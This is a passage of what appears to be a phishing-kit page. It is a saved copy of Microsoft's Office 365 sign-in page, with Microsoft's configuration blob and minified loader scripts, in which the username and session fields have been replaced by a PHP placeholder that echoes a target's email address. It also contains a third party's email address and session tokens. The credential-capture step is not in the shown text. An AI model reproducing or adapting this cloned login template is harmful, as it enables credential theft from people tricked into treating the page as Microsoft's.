Ds-NZJYcuzgp-9ZGjEcRicbf5-jfpr7fuN4tbGtdx27sYVUKhubGxu5c7UlzXq-frpgT49rvxuXCpIj_x_rv7x-nLuaH1H7zTKieCmsNJmBLzShkw9U8m-cbMsIvswMwLCLA-ig4OUt39iqvB-kbpfLB4Vv6mLAyJpbU0gonAoMgPwdzH_67ncm_P_c8njzSsMYCANOBqw2xBUMTpF__jCab1bJ7yTr9_bffDimvfxl3fCyX-Zby_m_gU1","urlCancel":"https://www.office.com/landing","urlResume":"https://login.microsoftonline.com/common/resume?ctx=rQIIAYWSO2_TUABG46RNHxJteIoJdWBAVE6ufX2dh4REGttN3PiGJHbzWCLHcRw7ju3YTpzmFzB2QlCkDowdmYCJEXXqCiMDKkyIASGx0P4Clk860reds7nGpnNpkAaPE1SaKjxkIIPUbD9P5lUWkkyeAqTK0CwJEWQhDagBAtC_tZn6O2ud3gZl_vWpuPvtu1M4Ix6MwtALCplMFEVpdzg0NT2tuZOMrToD0zHeEcQFQVwSxEl8VXdIpXkWD1iYRTkGAESxeRblqTyTljjBwpZxhFt8iDlx0m0CUJMbdlUeWdKkE0qTxrhr1ReYVmg8UVCXU6KOrDHYqodY5impdP03QLUlmNJ-JezKEurKBt2VhbFkdRZf4tu14iwc0dfj-uZS_xXfGLr-pOe5QXiSeBFvh95QYdSlpR2609KgVkN1vduz7dzCgKXZNKsIc4md7tudli6oMKJ52AR-kyWD3GxG9TtWy86JiB0qA2bpSdCSxvgZmHUsbLYFq45Rub2Yu5GGbXbEMc-G4dTd0yl2WhUCfs-rLacUtEc1wVFMjasiYeiOegOhmot4jZmPRgHVl40q3eaK5L4oimMZZe1FpbaEPA_pcWmJ55zSZ6FmiEX2KOBMrHIQ5gVFqvtF2JbNuYhKGprXzUN1TA4qeBLigMz6y04o-7aFqT3UBwtbq2Cx5_GqTCmAl0PslUH9bSJ5JXPiOueJLdfTHXOw4_nu0LT1r4nUWHeejoO-6vuuc-38YoX4sXJvPZlavx_biT26AxKF9fXNVOya_qwQb1avArp8lfukbiX4l_bvu5_fb8fOVzNKq5oNilZI5Zp0ES3lPl2JJFxWd7McNBqR6mB6ceAdHIR54wldoI6TxHEyeZ68WeF6mJebchFzxQZH98DPZPz5WuzDxn-S_Hgj9g81","iPawnIcon":0,"iPollingInterval":1,"sPOST_Username":"<?php echo $email ?>","sFT":"AQABAAEAAAD--DLA3VO7QrddgJg7WevrvzGTBai7rWYm2h_WPz31cMCfB1Z-tiWwZVuBfnz7ZLbkQS3Rt9neprd9mJAVvXttTlhtd6QyC2rc3iIxnltNaeqPrKPF0il_S4xjxamVXVGH6Yt8eoLV4GdPn_PwOur1c1vpNxj7nKnoHx58P_rqHzrRAPkmVY7fBPvXVv3fQRagnnebktfYxp2_GlUCvisCTLPX59xoB4fGIp8Ao7YKjCduLxn6r57rJa_qU4clXnW0XW-ZWQP65ZohoQuwFXqlzpFxAaGQO2-acesTJROmS1S7_UDvWVz91tLffDX_l8EUeAX8Qi3lEBpqVYbZjO32353FGQh3y70AcdIkY3KND4h4XQ9MDd_mTYqqmzn7R8MFdLBEeKhRqCCKeuTt_RorWg1vMBOeixVjIZT3yur3p_qlR7sSDW3CIJ574IZthebclH6JDiS56jjJtcM1c-Bt87G0X_uLNsif0B5zjR0DxwfI0_mnpyBfZk3_D0uNQkL6XAl01THIrH01Ij4_c0QzP_IbXlBvrIbC4lwjsejpjm9BCfBlnEC0HFZtZhtqd3qd7OFI3KYTyH-pf2rrN0OuIAA","sFTName":"flowToken","sFTCookieName":"ESTSWCTXFLOWTOKEN","sSessionIdentifierName":"code","sCtx":"rQIIAYWSO2_TUABG46RNHxJteIoJdWBAVE6ufX2dh4REGttN3PiGJHbzWCLHcRw7ju3YTpzmFzB2QlCkDowdmYCJEXXqCiMDKkyIASGx0P4Clk860reds7nGpnNpkAaPE1SaKjxkIIPUbD9P5lUWkkyeAqTK0CwJEWQhDagBAtC_tZn6O2ud3gZl_vWpuPvtu1M4Ix6MwtALCplMFEVpdzg0NT2tuZOMrToD0zHeEcQFQVwSxEl8VXdIpXkWD1iYRTkGAESxeRblqTyTljjBwpZxhFt8iDlx0m0CUJMbdlUeWdKkE0qTxrhr1ReYVmg8UVCXU6KOrDHYqodY5impdP03QLUlmNJ-JezKEurKBt2VhbFkdRZf4tu14iwc0dfj-uZS_xXfGLr-pOe5QXiSeBFvh95QYdSlpR2609KgVkN1vduz7dzCgKXZNKsIc4md7tudli6oMKJ52AR-kyWD3GxG9TtWy86JiB0qA2bpSdCSxvgZmHUsbLYFq45Rub2Yu5GGbXbEMc-G4dTd0yl2WhUCfs-rLacUtEc1wVFMjasiYeiOegOhmot4jZmPRgHVl40q3eaK5L4oimMZZe1FpbaEPA_pcWmJ55zSZ6FmiEX2KOBMrHIQ5gVFqvtF2JbNuYhKGprXzUN1TA4qeBLigMz6y04o-7aFqT3UBwtbq2Cx5_GqTCmAl0PslUH9bSJ5JXPiOueJLdfTHXOw4_nu0LT1r4nUWHeejoO-6vuuc-38YoX4sXJvPZlavx_biT26AxKF9fXNVOya_qwQb1avArp8lfukbiX4l_bvu5_fb8fOVzNKq5oNilZI5Zp0ES3lPl2JJFxWd7McNBqR6mB6ceAdHIR54wldoI6TxHEyeZ68WeF6mJebchFzxQZH98DPZPz5WuzDxn-S_Hgj9g81","iProductIcon":-1,"urlReportPageLoad":"https://login.microsoftonline.com/common/instrumentation/reportpageload?mkt=en-US","staticTenantBranding":null,"oAppCobranding":{},"iBackgroundImage":2,"arrSessions":[{"id":"c9f7f444-5ec6-45d8-a44a-d379d17e3d8a","name":"<?php echo $email ?>","displayName":"<?php echo $email ?>","fullName":"","idp":0,"idpAuthUrl":""},{"id":"db0ae51b-5e25-44c1-b832-c3118854cdb5","name":"vho@raasnutritionals.com","displayName":"vho@raasnutritionals.com","fullName":"","idp":0,"idpAuthUrl":""}],"fApplicationInsightsEnabled":false,"iApplicationInsightsEnabledPercentage":0,"urlSetDebugMode":"https://login.microsoftonline.com/common/debugmode","fEnableCssAnimation":true,"fAllowGrayOutLightBox":true,"fIsRemoteNGCSupported":true,"desktopSsoConfig":{"isEdgeAnaheimAllowed":true,"iwaEndpointUrlFormat":"https://autologon.microsoftazuread-sso.com/{0}/winauth/sso?client-request-id=9e5775fb-3013-4548-9b9e-4a2be6e96e3a","iwaSsoProbeUrlFormat":"https://autologon.microsoftazuread-sso.com/{0}/winauth/ssoprobe?client-request-id=9e5775fb-3013-4548-9b9e-4a2be6e96e3a","iwaIFrameUrlFormat":"https://autologon.microsoftazuread-sso.com/{0}/winauth/iframe?client-request-id=9e5775fb-3013-4548-9b9e-4a2be6e96e3a\u0026isAdalRequest=False","iwaRequestTimeoutInMs":10000,"startDesktopSsoOnPageLoad":false,"progressAnimationTimeout":10000,"isEdgeAllowed":false,"minDssoEdgeVersion":"17","isSafariAllowed":true,"redirectUri":"https://www.office.com/landing","redirectDssoErrorPostParams":{"error":"interaction_required","error_description":"Seamless single sign on failed for the user. This can happen if the user is unable to access on premises AD or intranet zone is not configured correctly\r\nTrace ID: defbe275-170c-4bc9-a30d-93a50d9c1f00\r\nCorrelation ID: 9e5775fb-3013-4548-9b9e-4a2be6e96e3a\r\nTimestamp: 2021-06-04 10:53:53Z","state":"XtpfU4azjcVoqCdOO5QeZ_ll8xg3Cuq7UFvM6qGlYWeFa3w2E3S0rS6-s8uu1bYjWl8J56fUd4zpM3jMkNP0uYjNiXFjQN5HXxvowcNl6hD4PftqoBe16qLFsEBpOzq13lhOFnUicDL5Ffoh_dFL8wEc4vhhs1bTgL2XDA-GJJJkT57lxIOz3EE32kCzNvDUb63cgJA6ysDiNaD339FUMQrA3XTivJ5Cc5vQiVak-dINmtNs-7rzYtTrljN1B5b0xlcINJ_pEaT1U0ETtNpH0Q"},"isIEAllowedForSsoProbe":true,"edgeRedirectUri":"https://autologon.microsoftazuread-sso.com/common/winauth/sso/edgeredirect?client-request-id=9e5775fb-3013-4548-9b9e-4a2be6e96e3a\u0026origin=login.microsoftonline.com\u0026is_redirected=1"},"urlLogin":"https://login.microsoftonline.com/common/reprocess?ctx=rQIIAYWSO2_TUABG46RNHxJteIoJdWBAVE6ufX2dh4REGttN3PiGJHbzWCLHcRw7ju3YTpzmFzB2QlCkDowdmYCJEXXqCiMDKkyIASGx0P4Clk860reds7nGpnNpkAaPE1SaKjxkIIPUbD9P5lUWkkyeAqTK0CwJEWQhDagBAtC_tZn6O2ud3gZl_vWpuPvtu1M4Ix6MwtALCplMFEVpdzg0NT2tuZOMrToD0zHeEcQFQVwSxEl8VXdIpXkWD1iYRTkGAESxeRblqTyTljjBwpZxhFt8iDlx0m0CUJMbdlUeWdKkE0qTxrhr1ReYVmg8UVCXU6KOrDHYqodY5impdP03QLUlmNJ-JezKEurKBt2VhbFkdRZf4tu14iwc0dfj-uZS_xXfGLr-pOe5QXiSeBFvh95QYdSlpR2609KgVkN1vduz7dzCgKXZNKsIc4md7tudli6oMKJ52AR-kyWD3GxG9TtWy86JiB0qA2bpSdCSxvgZmHUsbLYFq45Rub2Yu5GGbXbEMc-G4dTd0yl2WhUCfs-rLacUtEc1wVFMjasiYeiOegOhmot4jZmPRgHVl40q3eaK5L4oimMZZe1FpbaEPA_pcWmJ55zSZ6FmiEX2KOBMrHIQ5gVFqvtF2JbNuYhKGprXzUN1TA4qeBLigMz6y04o-7aFqT3UBwtbq2Cx5_GqTCmAl0PslUH9bSJ5JXPiOueJLdfTHXOw4_nu0LT1r4nUWHeejoO-6vuuc-38YoX4sXJvPZlavx_biT26AxKF9fXNVOya_qwQb1avArp8lfukbiX4l_bvu5_fb8fOVzNKq5oNilZI5Zp0ES3lPl2JJFxWd7McNBqR6mB6ceAdHIR54wldoI6TxHEyeZ68WeF6mJebchFzxQZH98DPZPz5WuzDxn-S_Hgj9g81","urlDssoStatus":"https://login.microsoftonline.com/common/instrumentation/dssostatus","iSessionPullType":2,"fUseSameSite":true,"iAllowedIdentities":2,"isGlobalTenant":true,"uiflavor":1001,"urlFidoHelp":"https://go.microsoft.com/fwlink/?linkid=2013738","urlFidoLogin":"https://login.microsoft.com/common/fido/get?uiflavor=Web","fIsFidoSupported":true,"fHideLocalAccount":false,"scid":1000,"hpgact":2000,"hpgid":1104,"pgid":"ConvergedSignIn","apiCanary":"AQABAAAAAAD--DLA3VO7QrddgJg7WevrcRu73Ce0Is2iZiWWiFhRMEJNmWlnsIhAaLxVFcLXBJZ7I6S3EFBwS9wSg_W6kV2TETnnbQ_yb-4O0Dv219-zbLJDE505jUAnOM4RXj4zRlL28GQQ8hKpsJ_940zJusQhJSwy0aKfucHt93Gowbe1mCplgtoZDrffWqQJTztx10AyOhLorNSzpHiPBJhul-5qr4tPu7DFnEMDi9ObnpboJyAA","canary":"UWL7sAjt18S2A5zTb2IwMNHa+7D3gRwanN2xKpKKt9g=7:1","correlationId":"9e5775fb-3013-4548-9b9e-4a2be6e96e3a","sessionId":"defbe275-170c-4bc9-a30d-93a50d9c1f00","locale":{"mkt":"en-US","lcid":1033},"slMaxRetry":2,"slReportFailure":true,"strings":{"desktopsso":{"authenticatingmessage":"Trying to sign you in"}},"enums":{"ClientMetricsModes":{"None":0,"SubmitOnPost":1,"SubmitOnRedirect":2,"InstrumentPlt":4}},"urls":{"instr":{"pageload":"https://login.microsoftonline.com/common/instrumentation/reportpageload","dssostatus":"https://login.microsoftonline.com/common/instrumentation/dssostatus"}},"browser":{"ltr":1,"Firefox":1,"_Win":1,"_M89":1,"_D0":1,"Full":1,"Win81":1,"RE_Gecko":1,"b":{"name":"Firefox","major":89,"minor":0},"os":{"name":"Windows","version":"10.0"},"V":"89.0"},"watson":{"url":"/common/handlers/watson","bundle":"https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/watson.min_ybdb1ixzkv-fkor2mu6q6w2.js","sbundle":"https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/watsonsupportwithjquery.3.5.min_dc940oomzau4rsu8qesnvg2.js","fbundle":"https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/frameworksupport.min_oadrnc13magb009k4d20lg2.js","resetErrorPeriod":5,"maxCorsErrors":-1,"maxInjectErrors":5,"maxErrors":10,"maxTotalErrors":3,"expSrcs":["https://login.microsoftonline.com","https://aadcdn.msauth.net/","https://aadcdn.msftauth.net/",".login.microsoftonline.com"],"envErrorRedirect":true,"envErrorUrl":"/common/handlers/enverror"},"loader":{"cdnRoots":["https://aadcdn.msauth.net/","https://aadcdn.msftauth.net/"],"logByThrowing":true},"serverDetails":{"slc":"ProdSlices","dc":"EUS","ri":"MN1XXXX","ver":{"v":[2,1,11722,26]},"rt":"2021-06-04T10:53:53","et":96},"clientEvents":{"useOneDSEventApi":true,"flush":60000,"autoPost":true,"autoPostDelay":1000,"minEvents":1,"maxEvents":1,"pltDelay":500,"appInsightsConfig":{"instrumentationKey":"69adc3c768bd4dc08c19416121249fcc-66f1668a-797b-4249-95e3-6c6651768c28-7293","webAnalyticsConfiguration":{"autoCapture":{"jsError":true}}},"defaultEventName":"IDUX_ESTSClientTelemetryEvent_WebWatson","serviceID":3},"country":"ID","fBreakBrandingSigninString":true,"fFixIncorrectApiCanaryUsage":true,"bsso":{"type":"none","reason":"Chrome: Pull suppressed as UseAgent did not meet required criteria, Other: Pull suppressed due to POST request"},"urlNoCookies":"https://login.microsoftonline.com/cookiesdisabled","fTrimChromeBssoUrl":true,"inlineMode":5,"fShowCopyDebugDetailsLink":true};
//]]></script> 
<script type="text/javascript">//<![CDATA[
!function(){var e=window,r=e.$Debug=e.$Debug||{},t=e.$Config||{};if(!r.appendLog){var n=[],o=0;r.appendLog=function(e){var r=t.maxDebugLog||25,a=(new Date).toUTCString()+":"+e;n.push(o+":"+a),n.length>r&&n.shift(),o++},r.getLogs=function(){return n}}}(),function(){function e(e,r){function t(a){var i=e[a];if(a<n-1){return void(o.r[i]?t(a+1):o.when(i,function(){t(a+1)}))}r(i)}var n=e.length;t(0)}function r(e,r,a){function i(){var e=!!u.method,o=e?u.method:a[0],i=u.extraArgs||[],s=n.$WebWatson;try{
var c=t(a,!e);if(i&&i.length>0){for(var d=i.length,l=0;l<d;l++){c.push(i[l])}}o.apply(r,c)}catch(e){return void(s&&s.submitFromException&&s.submitFromException(e))}}var u=o.r&&o.r[e];return r=r||this,u&&(u.skipTimeout?i():n.setTimeout(i,0)),u}function t(e,r){return Array.prototype.slice.call(e,r?1:0)}var n=window;n.$Do||(n.$Do={"q":[],"r":[],"removeItems":[],"lock":0,"o":[]});var o=n.$Do;o.when=function(t,n){function a(e){r(e,i,u)||o.q.push({"id":e,"c":i,"a":u})}var i=0,u=[],s=1;"function"==typeof n||(i=n,
s=2);for(var c=s;c<arguments.length;c++){u.push(arguments[c])}t instanceof Array?e(t,a):a(t)},o.register=function(e,t,n){if(!o.r[e]){o.o.push(e);var a={};if(t&&(a.method=t),n&&(a.skipTimeout=n),arguments&&arguments.length>3){a.extraArgs=[];for(var i=3;i<arguments.length;i++){a.extraArgs.push(arguments[i])}}o.r[e]=a,o.lock++;try{for(var u=0;u<o.q.length;u++){var s=o.q[u];s.id==e&&r(e,s.c,s.a)&&o.removeItems.push(s)}}catch(e){throw e}finally{if(0===--o.lock){for(var c=0;c<o.removeItems.length;c++){
for(var d=o.removeItems[c],l=0;l<o.q.length;l++){if(o.q[l]===d){o.q.splice(l,1);break}}}o.removeItems=[]}}}},o.unregister=function(e){o.r[e]&&delete o.r[e]}}(),function(e,r){function t(){if(!i){if(!r.body){return void setTimeout(t)}i=!0,e.$Do.register("doc.ready",0,!0)}}function n(){if(!u){if(!r.body){return void setTimeout(n)}t(),u=!0,e.$Do.register("doc.load",0,!0),a()}}function o(e){(r.addEventListener||"load"===e.type||"complete"===r.readyState)&&t()}function a(){
r.addEventListener?(r.removeEventListener("DOMContentLoaded",o,!1),e.removeEventListener("load",n,!1)):r.attachEvent&&(r.detachEvent("onreadystatechange",o),e.detachEvent("onload",n))}var i=!1,u=!1;if("complete"===r.readyState){return void setTimeout(n)}!function(){r.addEventListener?(r.addEventListener("DOMContentLoaded",o,!1),e.addEventListener("load",n,!1)):r.attachEvent&&(r.attachEvent("onreadystatechange",o),e.attachEvent("onload",n))}()}(window,document),function(){function e(){
return f.$Config||f.ServerData||{}}function r(e,r){var t=f.$Debug;t&&t.appendLog&&(r&&(e+=" '"+(r.src||r.href||"")+"'",e+=", id:"+(r.id||""),e+=", async:"+(r.async||""),e+=", defer:"+(r.defer||"")),t.appendLog(e))}function t(){var e=f.$B;if(void 0===d){if(e){d=e.IE}else{var r=f.navigator.userAgent;d=-1!==r.indexOf("MSIE ")||-1!==r.indexOf("Trident/")}}return d}function n(){var e=f.$B;if(void 0===l){if(e){l=e.RE_Edge}else{var r=f.navigator.userAgent;l=-1!==r.indexOf("Edge")}}return l}function o(e){
var r=e.indexOf("?"),t=r>-1?r:e.length,n=e.lastIndexOf(".",t);return e.substring(n,n+v.length).toLowerCase()===v}function a(){var r=e();return(r.loader||{}).slReportFailure||r.slReportFailure||!1}function i(){return(e().loader||{}).redirectToErrorPageOnLoadFailure||!1}function u(){return(e().loader||{}).logByThrowing||!1}function s(e){if(!t()&&!n()){return!1}var r=e.src||e.href||"";if(!r){return!0}if(o(r)){var a,i,u;try{a=e.sheet,i=a&&a.cssRules,u=!1}catch(e){u=!0}if(a&&!i&&u){return!0}
if(a&&i&&0===i.length){return!0}}return!1}function c(){function t(e){g.getElementsByTagName("head")[0].appendChild(e)}function n(e,r,t,n){var s=null;return s=o(e)?a(e):"script"===n.toLowerCase()?i(e):u(e,n),r&&(s.id=r),"function"==typeof s.setAttribute&&(s.setAttribute("crossorigin","anonymous"),t&&"string"==typeof t&&s.setAttribute("integrity",t)),s}function a(e){var r=g.createElement("link");return r.rel="stylesheet",r.type="text/css",r.href=e,r}function i(e){var r=g.createElement("script")
;return r.type="text/javascript",r.src=e,r.defer=!1,r.async=!1,r}function u(e,r){var t=g.createElement(r);return t.src=e,t}function d(e){if(!(m&&m.length>1)){return e}for(var r=0;r<m.length;r++){if(0===e.indexOf(m[r])){return m[r+1<m.length?r+1:0]+e.substring(m[r].length)}}return e}function l(e,t,n,o){if(r("[$Loader]: "+(b.failMessage||"Failed"),o),$[e].retry<p){return $[e].retry++,v(e,t,n),void c._ReportFailure($[e].retry,$[e].srcPath)}n&&n()}function f(e,t,n,o){if(s(o)){return l(e,t,n,o)}
r("[$Loader]: "+(b.successMessage||"Loaded"),o),v(e+1,t,n);var a=$[e].onSuccess;"function"==typeof a&&a($[e].srcPath)}function v(e,o,a){if(e<$.length){var i=$[e];if(!i||!i.srcPath){return void v(e+1,o,a)}i.retry>0&&(i.srcPath=d(i.srcPath),i.origId||(i.origId=i.id),i.id=i.origId+"_Retry_"+i.retry);var u=n(i.srcPath,i.id,i.integrity,i.tagName);u.onload=function(){f(e,o,a,u)},u.onerror=function(){l(e,o,a,u)},u.onreadystatechange=function(){"loaded"===u.readyState?setTimeout(function(){f(e,o,a,u)
},500):"complete"===u.readyState&&f(e,o,a,u)},t(u),r("[$Loader]: Loading '"+(i.srcPath||"")+"', id:"+(i.id||""))}else{o&&o()}}var h=e(),p=h.slMaxRetry||2,y=h.loader||{},m=y.cdnRoots||[],b=this,$=[];b.retryOnError=!0,b.successMessage="Loaded",b.failMessage="Error",b.Add=function(e,r,t,n,o,a){e&&$.push({"srcPath":e,"id":r,"retry":n||0,"integrity":t,"tagName":o||"script","onSuccess":a})},b.AddForReload=function(e,r){var t=e.src||e.href||"";b.Add(t,"AddForReload",e.integrity,1,e.tagName,r)},
b.AddIf=function(e,r,t){e&&b.Add(r,t)},b.Load=function(e,r){v(0,e,r)}}var d,l,f=window,g=f.document,v=".css";c.On=function(e,r,t){if(!e){throw"The target element must be provided and cannot be null."}r?c.OnError(e,t):c.OnSuccess(e,t)},c.OnSuccess=function(e,t){if(!e){throw"The target element must be provided and cannot be null."}if(s(e)){return c.OnError(e,t)}var n=e.src||e.href||"",o=a(),u=i();r("[$Loader]: Loaded",e);var d=new c;d.failMessage="Reload Failed",d.successMessage="Reload Success",
d.Load(null,function(){if(o){throw"Unexpected state. ResourceLoader.Load() failed despite initial load success. ['"+n+"']"}u&&(document.location.href="/error.aspx?err=504")})},c.OnError=function(e,t){var n=e.src||e.href||"",o=a(),u=i();if(!e){throw"The target element must be provided and cannot be null."}r("[$Loader]: Failed",e);var s=new c;s.failMessage="Reload Failed",s.successMessage="Reload Success",s.AddForReload(e,t),s.Load(null,function(){if(o){throw"Failed to load external resource ['"+n+"']"}
u&&(document.location.href="/error.aspx?err=504")}),c._ReportFailure(0,n)},c._ReportFailure=function(e,r){if(u()&&!t()){throw"[Retry "+e+"] Failed to load external resource ['"+r+"'], reloading from fallback CDN endpoint"}},f.$Loader=c}(),function(){function e(){if(!$){var e=new h.$Loader;e.AddIf(!h.jQuery,y.sbundle,"WebWatson_DemandSupport"),y.sbundle=null,delete y.sbundle,e.AddIf(!h.$Api,y.fbundle,"WebWatson_DemandFramework"),y.fbundle=null,delete y.fbundle,e.Add(y.bundle,"WebWatson_DemandLoaded"),
e.Load(r,t),$=!0}}function r(){if(h.$WebWatson){if(h.$WebWatson.isProxy){return void t()}m.when("$WebWatson.full",function(){for(;b.length>0;){var e=b.shift();e&&h.$WebWatson[e.cmdName].apply(h.$WebWatson,e.args)}})}}function t(){if(!h.$WebWatson||h.$WebWatson.isProxy){if(!w&&JSON){try{var e=new XMLHttpRequest;e.open("POST",y.url),e.setRequestHeader("Accept","application/json"),e.setRequestHeader("Content-Type","application/json; charset=UTF-8"),e.setRequestHeader("canary",p.apiCanary),
e.setRequestHeader("client-request-id",p.correlationId),e.setRequestHeader("hpgid",p.hpgid||0),e.setRequestHeader("hpgact",p.hpgact||0);for(var r=-1,t=0;t<b.length;t++){if("submit"===b[t].cmdName){r=t;break}}var o=b[r]?b[r].args||[]:[],a={"sr":y.sr,"ec":"Failed to load external resource [Core Watson files]","wec":55,"idx":1,"pn":p.pgid||"","sc":p.scid||0,"hpg":p.hpgid||0,"msg":"Failed to load external resource [Core Watson files]","url":o[1]||"","ln":0,"ad":0,"an":!1,"cs":"","sd":p.serverDetails,"ls":null,
"diag":v(y)};e.send(JSON.stringify(a))}catch(e){}w=!0}y.loadErrorUrl&&window.location.assign(y.loadErrorUrl)}n()}function n(){b=[],h.$WebWatson=null}function o(r){return function(){var t=arguments;b.push({"cmdName":r,"args":t}),e()}}function a(){var e=["foundException","resetException","submit"],r=this;r.isProxy=!0;for(var t=e.length,n=0;n<t;n++){var a=e[n];a&&(r[a]=o(a))}}function i(e,r,t,n,o,a,i){var u=h.event;return a||(a=l(o||u,i?i+2:2)),
h.$Debug&&h.$Debug.appendLog&&h.$Debug.appendLog("[WebWatson]:"+(e||"")+" in "+(r||"")+" @ "+(t||"??")),E.submit(e,r,t,n,o||u,a,i)}function u(e,r){return{"signature":e,"args":r,"toString":function(){return this.signature}}}function s(e){for(var r=[],t=e.split("\n"),n=0;n<t.length;n++){r.push(u(t[n],[]))}return r}function c(e){for(var r=[],t=e.split("\n"),n=0;n<t.length;n++){var o=u(t[n],[]);t[n+1]&&(o.signature+="@"+t[n+1],n++),r.push(o)}return r}function d(e){if(!e){return null}try{if(e.stack){
return s(e.stack)}if(e.error){if(e.error.stack){return s(e.error.stack)}}else if(window.opera&&e.message){return c(e.message)}}catch(e){}return null}function l(e,r){var t=[];try{for(var n=arguments.callee;r>0;){n=n?n.caller:n,r--}for(var o=0;n&&o<L;){var a="InvalidMethod()";try{a=n.toString()}catch(e){}var i=[],s=n.args||n.arguments;if(s){for(var c=0;c<s.length;c++){i[c]=s[c]}}t.push(u(a,i)),n=n.caller,o++}}catch(e){t.push(u(e.toString(),[]))}var l=d(e)
;return l&&(t.push(u("--- Error Event Stack -----------------",[])),t=t.concat(l)),t}function f(e){if(e){try{var r=/function (.{1,})\(/,t=r.exec(e.constructor.toString());return t&&t.length>1?t[1]:""}catch(e){}}return""}function g(e){if(e){try{if("string"!=typeof e&&JSON&&JSON.stringify){var r=f(e),t=JSON.stringify(e);return t&&"{}"!==t||(e.error&&(e=e.error,r=f(e)),(t=JSON.stringify(e))&&"{}"!==t||(t=e.toString())),r+":"+t}}catch(e){}}return""+(e||"")}function v(e){var r=[];try{
if(jQuery?(r.push("jQuery v:"+jQuery().jquery),jQuery.easing?r.push("jQuery.easing:"+JSON.stringify(jQuery.easing)):r.push("jQuery.easing is not defined")):r.push("jQuery is not defined"),e&&e.expectedVersion&&r.push("Expected jQuery v:"+e.expectedVersion),m){var t,n="";for(t=0;t<m.o.length;t++){n+=m.o[t]+";"}for(r.push("$Do.o["+n+"]"),n="",t=0;t<m.q.length;t++){n+=m.q[t].id+";"}r.push("$Do.q["+n+"]")}if(h.$Debug&&h.$Debug.getLogs){var o=h.$Debug.getLogs();o&&o.length>0&&(r=r.concat(o))}if(b){
for(var a=0;a<b.length;a++){var i=b[a];if(i&&"submit"===i.cmdName){try{if(JSON&&JSON.stringify){var u=JSON.stringify(i);u&&r.push(u)}}catch(e){r.push(g(e))}}}}}catch(e){r.push(g(e))}return r}var h=window,p=h.$Config||{},y=p.watson,m=h.$Do;if(!h.$WebWatson&&y){var b=[],$=!1,w=!1,L=10,E=h.$WebWatson=new a;E.CB={},E._orgErrorHandler=h.onerror,h.onerror=i,E.errorHooked=!0,m.when("jQuery.version",function(e){y.expectedVersion=e}),m.register("$WebWatson")}}(),function(){function e(e,r){
for(var t=r.split("."),n=t.length,o=0;o<n&&null!==e&&void 0!==e;){e=e[t[o++]]}return e}function r(r){var t=null;return null===s&&(s=e(a,"Constants")),null!==s&&r&&(t=e(s,r)),null===t||void 0===t?"":t.toString()}function t(t){var n=null;return null===i&&(i=e(a,"$Config.strings")),null!==i&&t&&(n=e(i,t.toLowerCase())),null!==n&&void 0!==n||(n=r(t)),null===n||void 0===n?"":n.toString()}function n(e,r){var n=null;return e&&r&&r[e]&&(n=t("errors."+r[e])),n||(n=t("errors."+e)),n||(n=t("errors."+c)),n||(n=t(c)),n}
function o(t){var n=null;return null===u&&(u=e(a,"$Config.urls")),null!==u&&t&&(n=e(u,t.toLowerCase())),null!==n&&void 0!==n||(n=r(t)),null===n||void 0===n?"":n.toString()}var a=window,i=null,u=null,s=null,c="GENERIC_ERROR";a.GetString=t,a.GetErrorString=n,a.GetUrl=o}(),function(){var e=window,r=e.$Config||{};e.$B=r.browser||{}}();

//]]></script> 

        <link rel="prefetch" href="https://login.live.com/Me.htm?v=3">
        <link rel="shortcut icon" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">

    <script type="text/javascript">
        ServerData = $Config;
    </script>


    
    <link crossorigin="anonymous" href="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_ty_bk5wxx82kilmq7o6qlw2.css" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-bCyVjjjcDwLU5BPY/Ibci5HH1EkyQOAHr9MvdigBdTv3GLFoxCKt7IJvU1bo99CL">




<link rel="prefetch" href="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_ty_bk5wxx82kilmq7o6qlw2.css"><link rel="prefetch" href="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/ux.converged.login.strings-en.min_lx3ffqwkjnm_dkzr2tvi6q2.js"><script charset="utf-8" src="https://aadcdn.msftauth.net/shared/1.0/content/js/asyncchunk/convergedlogin_ppassword_d6cc7396cd18034977d2.js"></script></head>

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">
    <script type="text/javascript">//<![CDATA[
!function(){var e=window,o=e.document,i=e.$Config||{};if(e.self===e.top){o&&o.body&&(o.body.style.display="block")}else if(!i.allowFrame){var s=e.self.location.href,l=s.indexOf("#"),n=-1!==l,t=s.indexOf("?"),f=n?l:s.length,d=-1===t||n&&t>l?"?":"&";s=s.substr(0,f)+d+"iframe-request-id="+i.sessionId+s.substr(f),e.top.location=s}}();

//]]></script>
    <script type="text/javascript">
//<![CDATA[
(function () {
var $Prefetch={"rfPre":true,"delay":5000,"maxHistory":4,"maxAge":43200,"ageRes":1440,"name":"clrc","fetch":[{"path":"https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_ty_bk5wxx82kilmq7o6qlw2.css","hash":"FEXlSycY","co":true,"rf":true},{"path":"https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/ux.converged.login.strings-en.min_lx3ffqwkjnm_dkzr2tvi6q2.js","hash":"akIoPr9G","co":true,"rf":true}],"mode":5};
!function(e,t,n){function r(e){x.appendLog&&x.appendLog("Client Prefetch: "+e)}function i(){try{for(var e=t.cookie.split(";"),r=0;r<e.length;r++){var i=e[r];if(i){var o=i.indexOf("=");if(-1!==o){if(i.substr(0,o).trim()===n.name){var u=i.substr(o+1);return JSON.parse(c(u))}}}}}catch(e){}return{}}function o(e,t,n){return e.replace(t,n)}function c(e){return e=o(e,/%5c/g,"\\"),e=o(e,/%3e/g,">"),e=o(e,/%3d/g,"="),e=o(e,/%3c/g,"<"),e=o(e,/%3b/g,";"),e=o(e,/%3a/g,":"),e=o(e,/%2c/g,","),e=o(e,/%27/g,"'"),
